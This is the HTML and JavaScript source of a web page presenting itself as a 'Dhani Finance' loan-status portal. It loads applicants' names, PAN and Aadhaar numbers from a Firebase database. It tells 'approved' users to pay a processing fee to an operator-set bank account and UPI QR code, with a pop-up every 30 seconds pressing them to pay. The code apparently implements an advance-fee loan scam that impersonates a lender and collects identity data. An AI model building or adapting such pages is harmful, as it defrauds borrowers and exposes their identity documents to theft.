<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dhani Finance ‚Äì Loan Status</title>

<style>
:root{
  --accent:#2563eb;
  --bg:#fffdf2;
  --text:#333;
  --base:11px;
  --small:10px;
  --sign:11px;
}

/* RESET */
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

/* BODY */
body{
  font-family:Arial, sans-serif;
  background:var(--bg);
  color:var(--text);
  padding:10px;
  position:relative;
}

/* SCREEN WATERMARK */
body::before{
  content:"DHANI FINANCE";
  position:fixed;
  inset:0;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:50px;
  font-weight:900;
  color:rgba(180,180,180,.12);
  transform:rotate(-30deg);
  pointer-events:none;
  z-index:0;
}

/* LOADING */
#loading{
  position:fixed;
  inset:0;
  display:flex;
  justify-content:center;
  align-items:center;
  background:rgba(255,255,255,.85);
  z-index:9999;
  font-size:18px;
  font-weight:bold;
}

/* HEADER */
h1{
  text-align:center;
  color:#2563eb;
  font-size:14px;
  margin-bottom:8px;
}

/* LABELS */
.label{
  font-weight:bold;
  font-size:var(--base);
  margin-bottom:4px;
  position:relative;
  z-index:1;
}
.label span{
  background:#fff3cd;
  padding:2px 4px;
  border-radius:3px;
}

/* PENDING */
.pending-message{
  margin-top:15px;
  font-size:var(--base);
  line-height:1.4;
  text-align:center;
  color:#444;
  display:none;
}

/* APPROVED CONTENT */
.approved-mobile,
.approved-content{
  margin-top:12px;
  font-size:var(--base);
  line-height:1.4;
  padding:6px;
  position:relative;
  z-index:1;
}

/* QR */
.qr-box{
  margin-top:10px;
}
.qr-box p{
  font-weight:bold;
  margin-bottom:4px;
}
#upiQR{
  display:inline-block;
  padding:6px;
  border:1px dashed #999;
  width:130px;
  height:130px;
}

/* FLOATING BUTTONS */
.call-float{
  position:fixed;
  top:10px;
  right:10px;
  z-index:999;
  display:flex;
  flex-direction:column;
  gap:10px;
}

.call-btn,
.pdf-btn,
#stopReminderBtn{
  font-size:26px;
  background:none;
  border:none;
  cursor:pointer;
  animation:pulse 1.5s infinite;
}

.call-btn{color:#dc2626;}
.pdf-btn{color:#2563eb;}

@keyframes pulse{
  0%{transform:scale(1)}
  50%{transform:scale(1.15)}
  100%{transform:scale(1)}
}

/* STOP REMINDER */
#stopReminderBtn{
  font-size:14px;
  background:#2563eb;
  color:#fff;
  padding:6px 10px;
  border-radius:5px;
  animation:none;
}

/* PAGE CONTENT (SCREEN + PDF) */
.page{
  display:none;
  margin:0;        /* ‚ùå no spacing like card */
  padding:0;       /* ‚ùå no padding */
  background:none; /* ‚ùå no bg */
  box-shadow:none; /* ‚ùå no shadow */
}

.page h2{
  color:var(--accent);
  font-size:13px;
  text-align:center;
  margin-bottom:6px;
}
.page p,
.page li{
  font-size:var(--base);
  line-height:1.35;
}
.page ul{
  margin-left:14px;
}

/* SIGNATURE */
.signatory{
  margin-top:8px;
  font-size:var(--sign);
  font-weight:bold;
  text-align:right;
}

/* ================= PDF ONLY ================= */

/* Each wrapper = exactly ONE page */
.page-wrapper{
  width:100%;
  padding:0;                 /* ‚ùå padding removed */
  margin:0;                  /* ‚ùå margin removed */
  background:transparent;    /* ‚ùå no card bg */
  page-break-inside:avoid;
}

.page-wrapper:not(:last-child){
  page-break-after:always;
}

/* ================= MOBILE ================= */
@media(max-width:480px){
  h1{font-size:16px;}
  .label,
  .page p,
  .page li,
  .approved-content{
    font-size:12px;
  }
  .page h2{font-size:14px;}
}
</style>
</head>

<body>

<!-- LOADING -->
<div id="loading">Loading...</div>

<h1>Dhani Finance Pvt. Ltd.</h1><br>

<!-- Approved fields -->
<div id="approvedFields" style="display:none;">
  <div class="label">üë§ Name ‚Äì <span id="display_name"></span></div>
  <div class="label">üì± Mobile ‚Äì <span id="display_mobile"></span></div>
  <div class="label">üÜî PAN ‚Äì <span id="display_pan"></span></div>
  <div class="label">üóÇ Aadhaar ‚Äì <span id="display_aadhaar"></span></div>
  <div class="label">üí∞ Loan Amount ‚Äì <span id="display_amount"></span></div>
</div>

<!-- Pending / Approved -->
<div class="pending-message" id="pendingMsg">
  Your loan application has been submitted successfully.<br>
  Hamari team aapki details verify kar rahi hai. Jaldi hi aapko update milega.
</div>

<div class="approved-mobile" id="approvedMsg"></div>

<!-- Floating Buttons -->
<div class="call-float">
  <a id="callAdminBtn" href="tel:1800123456" class="call-btn" title="Call Admin">üìû</a>
  <button class="pdf-btn" id="downloadPDF" title="Download PDF" style="display:none;">üìÑ</button>
</div>

<!-- Pages -->
<div class="page" id="page2">
  <h2>Documents Required</h2>
  <ul>
    <li>PAN Card</li>
    <li>Aadhaar Card</li>
    <li>Latest Salary Slip or Income Proof</li>
    <li>Bank Statement (last 6 months)</li>
    <li>Passport-sized Photograph</li>
    <li>Completed Loan Application Form</li>
  </ul>
</div>

<div class="page" id="page3">
  <h2>Terms & Conditions</h2>
  <ul>
    <li>Interest rates and EMI schedules are as per the loan agreement.</li>
    <li>Late payments may incur additional charges.</li>
    <li>All information provided must be accurate and truthful.</li>
    <li>Loan disbursal is subject to verification of documents.</li>
    <li>The processing fee is non-refundable after approval if documents are incomplete.</li>
    <li>Dhani Finance reserves the right to amend terms without prior notice.</li>
  </ul>
</div>

<div class="page" id="page4">
  <h2>Privacy & Policy</h2>
  <ul>
    <li>All personal data provided is kept confidential.</li>
    <li>Information is only shared with authorized personnel for loan processing.</li>
    <li>We comply with all applicable data protection regulations.</li>
    <li>Your banking details and documents are securely stored in encrypted databases.</li>
    <li>We do not sell or share your information with third parties for marketing purposes.</li>
    <li>You have the right to request deletion or correction of your personal data.</li>
  </ul>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
<!-- QR CODE LIBRARY -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script>
// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCsIYVX3OawpDlFZpKU3KpRsfM7QQoyWyY",
  authDomain: "onlineservice-9f153.firebaseapp.com",
  databaseURL: "https://onlineservice-9f153-default-rtdb.firebaseio.com",
  projectId: "onlineservice-9f153",
  storageBucket: "onlineservice-9f153.appspot.com",
  messagingSenderId: "1040271430967",
  appId: "1:1040271430967:web:6325b056257454943d36b2"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

function todayDate(){
  const d = new Date();
  return d.toLocaleDateString("en-GB",{day:"2-digit",month:"short",year:"numeric"});
}

function formatTenure(totalMonths){
  let years = Math.floor(totalMonths / 12);
  let months = totalMonths % 12;
  return `${years} Years, ${months} Months`;
}

let reminderInterval;

firebase.auth().onAuthStateChanged(user => {
  if(!user) return;
  const aadhaar = localStorage.getItem("loan_aadhaar");
  if(!aadhaar) return;

  db.ref("loanUsers/" + aadhaar).once("value").then(snap => {
    document.getElementById('loading').style.display = "none";
    if(!snap.exists()) return;

    const d = snap.val();
    const payInfo = d.payAtThisAccount || {};

    display_name.textContent = d.name || "-";
    display_mobile.textContent = d.mobile || "-";
    display_pan.textContent = d.pan || "-";
    display_aadhaar.textContent = d.aadhaar || "-";
    display_amount.textContent = "‚Çπ" + (d.amount || 0).toLocaleString("en-IN");

    if(d.status === "Approved"){
      pendingMsg.style.display = "none";
      document.getElementById("approvedFields").style.display = "block";
      document.getElementById("downloadPDF").style.display = "block";

      let totalMonths = (parseInt(d.tenureYears || 0) * 12) + parseInt(d.tenureMonths || 0);
      const formattedTenure = formatTenure(totalMonths);

      // UPI Link
      const upiLink = `upi://pay?pa=${payInfo.upi||""}&pn=${encodeURIComponent(payInfo.name||"Dhani Finance")}&am=${d.processingFee||0}&cu=INR`;

      approvedMsg.innerHTML = `
<div class="approved-content">
<p><b>Dear ${d.name || ""},</b></p>
<p>We are very glad to inform you that in response to your request for a loan in order to meet your financial needs.
At the outset we welcome you to meet of Dhani Finance pvt.Ltd.</p><br>

<p>You requested a short term loan, Sum of loan amount
<b>‚Çπ${(d.amount||0).toLocaleString("en-IN")}/-</b>
for the tenure of
<b>${formattedTenure}</b>
on dated <b>${todayDate()}</b>.
Your monthly EMI is <b>‚Çπ${(d.emi||0).toLocaleString("en-IN")}/-</b>
at the rate of <b>${d.interestRate||"0"}%</b>.</p><br>

<p>When you submit File Processing Fee of
<b>‚Çπ${(d.processingFee||0).toLocaleString("en-IN")}/-</b>, we will credit
your approved loan to your bank account.</p><br>

<p><b>Pay at This Account</b></p>
<p>
Name ‚Äì ${payInfo.name || "-"}<br>
A/c No. ‚Äì ${payInfo.account || "-"}<br>
IFSC Code ‚Äì ${payInfo.ifsc || "-"}<br>
UPI ID ‚Äì <b>${payInfo.upi || "-"}</b>
</p>

<div class="qr-box">
<p>Scan & Pay (UPI)</p>
<div id="upiQR"></div>
</div>

<p class="note"><b>Note:-</b><br>
1. We do not accept cash deposit.<br>
2. We accept only NEFT/IMPS/Mobile Banking/Net Banking.<br>
3. Processing fee will be refundable within 24 hours.</p><br>

<p class="signatory">Authorized Signatory<br>Dhani Finance Pvt. Ltd.</p>
</div>`;

      // Generate QR code
      new QRCode(document.getElementById("upiQR"), {
        text: upiLink,
        width: 120,
        height: 120
      });

      approvedMsg.style.display="block";
      callAdminBtn.href = "tel:" + (payInfo.helpline || "1800123456");

      document.getElementById("page2").style.display="block";
      document.getElementById("page3").style.display="block";
      document.getElementById("page4").style.display="block";

      if(d.processingFee && d.processingFee > 0){
          document.getElementById("stopReminderBtn").style.display = "flex";
          reminderInterval = setInterval(() => {
              alert(`Dear ${d.name || "User"}, your loan has been approved. Please submit the processing fee of ‚Çπ${d.processingFee.toLocaleString("en-IN")}/- to credit your loan.`);
          }, 30000);
      }

    } else {
      pendingMsg.style.display = "block";
      approvedMsg.style.display = "none";
      document.getElementById("approvedFields").style.display = "none";
      document.getElementById("page2").style.display = "none";
      document.getElementById("page3").style.display = "none";
      document.getElementById("page4").style.display = "none";
      document.getElementById("downloadPDF").style.display = "none";
      callAdminBtn.href = "tel:1800123456";
    }

  }).catch(err => {
    document.getElementById('loading').style.display = "none"; 
    console.error(err);
  });
});
document.getElementById("downloadPDF").addEventListener("click", () => {

  const pdfContainer = document.createElement("div");
  // Create watermark for PDF
const watermark = document.createElement("div");
watermark.textContent = "DHANI FINANCE";
watermark.style.position = "absolute";
watermark.style.top = "50%";
watermark.style.left = "50%";
watermark.style.transform = "translate(-50%, -50%) rotate(-30deg)";
watermark.style.fontSize = "50px";
watermark.style.fontWeight = "900";
watermark.style.color = "rgba(180,180,180,0.12)";
watermark.style.pointerEvents = "none";
watermark.style.zIndex = "0";

// Append watermark to pdfContainer BEFORE pages
pdfContainer.insertBefore(watermark, pdfContainer.firstChild);


  /* ========= PAGE 1 ========= */
  const firstPage = document.createElement("div");
  firstPage.className = "page-wrapper";

  // üî• CLONE HEADER
  const header = document.querySelector("h1").cloneNode(true);
  header.style.marginBottom = "10px";
  firstPage.appendChild(header);

  // Approved fields
  const approvedFieldsClone = document.getElementById("approvedFields").cloneNode(true);
  approvedFieldsClone.style.display = "block";
  firstPage.appendChild(approvedFieldsClone);

  // Approved letter
  const approvedMsgClone = document.getElementById("approvedMsg").cloneNode(true);
  approvedMsgClone.style.display = "block";
  firstPage.appendChild(approvedMsgClone);

  pdfContainer.appendChild(firstPage);

  /* ========= OTHER PAGES ========= */
  ["page2","page3","page4"].forEach(id=>{
    const page = document.getElementById(id);
    if(page && page.style.display !== "none"){
      const wrapper = document.createElement("div");
      wrapper.className = "page-wrapper";

      const clone = page.cloneNode(true);
      clone.style.display = "block";

      wrapper.appendChild(clone);
      pdfContainer.appendChild(wrapper);
    }
  });

  html2pdf().set({
    margin:0.25,
    filename:(display_name.textContent || "LoanUser") + ".pdf",
    image:{type:"jpeg",quality:1},
    html2canvas:{
      scale:2,
      useCORS:true,
      backgroundColor:"#fffdf2"
    },
    jsPDF:{unit:"in",format:"a5",orientation:"portrait"}
  }).from(pdfContainer).save();
});
</script>

</body>
</html>
